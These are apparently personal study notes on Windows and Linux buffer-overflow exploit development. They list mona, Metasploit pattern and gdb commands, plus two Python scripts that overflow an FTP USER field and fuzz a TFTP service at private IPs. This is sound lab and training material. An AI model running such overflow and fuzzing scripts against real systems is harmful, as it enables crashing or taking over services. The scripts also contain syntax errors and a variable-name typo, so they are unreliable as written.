Network Exploit Development

[*] Tools - Windows Debugging
	Wingdb
	Windebug
	Immunity Debugger
		!mona patter_create 1100
			Text file created, contains the patter worth X amount of bites like 1100.
		!mona findmsp
		!mona jmp -r esp -cpb '\x00\x0a\x0d\x40'
			rsp for 64 bit
		bp 0x77c35459
			This is a breakpoint
	/usr/share/metasploit-framework/tools/exploit/pattern_create.rb
		-l <length of characters for gdb testing>
	/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb
		-q <memory address where we seg faulted>
			This will give us the exact length before seg fault
	gdb
		gdb <program>
		disassemble <function like "main">
		r #  To run the program, arguments work as well
	readelf
		readelf -l <program>
			displays information about elf files
	ldd
		ldd <program>
			This will give you sharable dependencies during program

[*] Tools - Linux 
	man ascii
		Check HEX value for alphabet conversion.
	Georgia Weidman script - warftpskel.py

		#!/usr/bin/env python
		
		import socket
		
		
		buffer = "A" * 1100
		
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		connect = s.connect(('192.168.1.50', 21))
		response = s.recv(1024)
		print(response)
		
		s.send('USER ' + buffer '\r\n')
		response = s.recv(1024)
		print(response)
		
		s.send('PASS PASSWORD\r\n')
		s.close()

	Georgia Weidman script - 3comfuzzer.py

		#!/usr/bin/env python
		import socket
		buffer_array = ["A" * 100]
		addition = 200
		
		while len(buffer_array) <= 50:
		    buffer_array.append("A" * addition)
		    addition += 100
		
		for value in buffer_array:
		    tftp_packet = "\x00\x02" + "Georgia" | "\x00" + value + "\x00"
		    print "Fuzzing with length " + str(len(value))
		    print tftp_packet
		    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		    s.sendto(tfpt_packet, ('10.0.0.37', 69))
		    response = s.recvfrom(2048)
		    print response


[*] Metasploit Module
	After creating a metasploit module, use msftidy to clean up your exploit:
		/usr/share/metasploit-framework/tools/dev/msftidy.rb
